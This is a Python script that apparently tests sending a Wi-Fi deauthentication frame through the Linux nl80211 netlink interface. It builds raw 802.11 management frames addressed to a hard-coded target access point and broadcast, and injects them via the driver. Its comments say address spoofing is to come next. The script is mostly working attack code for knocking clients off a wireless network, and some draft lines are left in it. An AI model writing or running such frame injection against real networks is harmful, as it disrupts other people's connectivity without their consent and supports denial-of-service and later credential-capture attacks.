#!/usr/bin/env python3
"""Quick test: send one deauth via nl80211 CMD_FRAME and check result"""
import socket, struct

IFNAME = b"wlan0"
BSSID = bytes.fromhex("046761d6dc92")
OWN_MAC = bytes.fromhex("5c17cfbca4e3")
FREQ = 2412

# nl80211 constants
NL80211_CMD_FRAME = 55
NL80211_ATTR_WIPHY = 1
NL80211_ATTR_IFINDEX = 3
NL80211_ATTR_WIPHY_FREQ = 38
NL80211_ATTR_FRAME = 51
NL80211_ATTR_DONT_WAIT_FOR_ACK = 142

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    name = b"nl80211\x00"
    attr = struct.pack("HH", 4 + len(name), 2) + name
    if len(attr) % 4: attr += b'\x00' * (4 - len(attr) % 4)
    msg = struct.pack("BBHI", 16, 3, 0, 0) + attr
    hdr = struct.pack("IHHII", 16 + len(msg), NLM_F_REQUEST | NLM_F_ACK, 0, 1, 0)
    s.send(hdr + msg)
    data = s.recv(4096)
    s.close()
    # Parse response for family ID
    if len(data) > 24:
        return struct.unpack_from("H", data, 24 + 4)[0]
    return None

def get_ifindex():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    import fcntl
    result = fcntl.ioctl(s, 0x8933, struct.pack('256s', IFNAME))
    s.close()
    return struct.unpack('I', result[16:20])[0]

def nla(type_id, data):
    padded = data + b'\x00' * ((4 - len(data) % 4) % 4)
    return struct.pack("HH", 4 + len(data), type_id) + padded

def send_frame(fam_id, ifindex, frame, freq=FREQ):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))

    attrs = b""
    attrs += nla(NL80211_ATTR_IFINDEX, struct.pack("I", ifindex))
    attrs += nla(NL80211_ATTR_WIPHY_FREQ, struct.pack("I", freq))
    attrs += nla(NL80211_ATTR_FRAME, frame)
    attrs += nla(NL80211_ATTR_DONT_WAIT_FOR_ACK, b"")

    genmsg = struct.pack("BBH", fam_id & 0xff, 1, 0) + struct.pack("BBHI", NL80211_CMD_FRAME, 1, 0, 0)[4:4]
    # Actually genlmsg header: family_id (is the cmd), version, reserved
    payload = struct.pack("BBHI", NL80211_CMD_FRAME, 1, 0, 0) + attrs

    # Wait, genlmsg_hdr is: cmd(1) version(1) reserved(2), after nlmsghdr
    genhdr = struct.pack("BBH", NL80211_CMD_FRAME, 1, 0)
    full_payload = genhdr + attrs

    nllen = 16 + len(full_payload)
    nlhdr = struct.pack("IHHII", nllen, fam_id, NLM_F_REQUEST | NLM_F_ACK, 1, 0)

    s.send(nlhdr + full_payload)

    resp = s.recv(4096)
    s.close()

    # Parse nlmsgerr
    if len(resp) >= 20:
        msg_type = struct.unpack_from("H", resp, 4)[0]
        if msg_type == 2:  # NLMSG_ERROR
            error = struct.unpack_from("i", resp, 16)[0]
            return error
    return None

# Build deauth frame with OWN MAC as SA (no spoofing first, just test TX)
# FC=0x00c0 (deauth), Duration=0, DA=broadcast, SA=own, BSSID=target
frame = struct.pack("<H", 0x00c0)  # FC: deauth
frame += struct.pack("<H", 0x0000)  # duration
frame += b'\xff\xff\xff\xff\xff\xff'  # DA: broadcast
frame += OWN_MAC              # SA: own mac
frame += BSSID                # BSSID: target AP
frame += struct.pack("<H", 0)  # seq
frame += struct.pack("<HH", 7, 0)  # reason: class3 from nonassoc

fam = get_nl80211_family()
ifidx = get_ifindex()
print(f"nl80211 family={fam}, ifindex={ifidx}")

# Send primer with own SA first
print("Sending primer (probe req with own SA)...")
probe = struct.pack("<H", 0x0040)  # FC: probe req
probe += struct.pack("<H", 0)       # duration
probe += b'\xff\xff\xff\xff\xff\xff'  # DA
probe += OWN_MAC                     # SA
probe += b'\xff\xff\xff\xff\xff\xff'  # BSSID
probe += struct.pack("<H", 0)       # seq
rc = send_frame(fam, ifidx, probe)
print(f"  Primer rc={rc}")

print("Sending deauth frame...")
rc = send_frame(fam, ifidx, frame)
print(f"  Deauth rc={rc}")

if rc == 0:
    print("SUCCESS - frame accepted by driver!")
    print("Check tcpdump/airodump to verify over-the-air TX")
elif rc is not None:
    import os
    print(f"ERROR: {rc} ({os.strerror(-rc) if rc < 0 else 'unknown'})")
else:
    print("No response from kernel")
